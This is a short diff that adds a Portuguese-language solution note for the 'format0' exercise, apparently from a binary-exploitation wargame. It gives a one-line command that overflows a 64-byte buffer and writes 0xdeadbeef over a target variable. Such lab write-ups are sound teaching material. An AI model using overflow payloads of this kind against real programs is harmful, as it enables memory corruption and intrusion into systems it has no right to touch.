@@ -1,0 +1,3 @@
+Apenas colocar o comando:
+  ./format0 `python -c 'print "A"*64+"\xef\xbe\xad\xde"'`
+    Pois temos o numeros do buffer da função e temos o alvo "target == 0xdeadbeef"
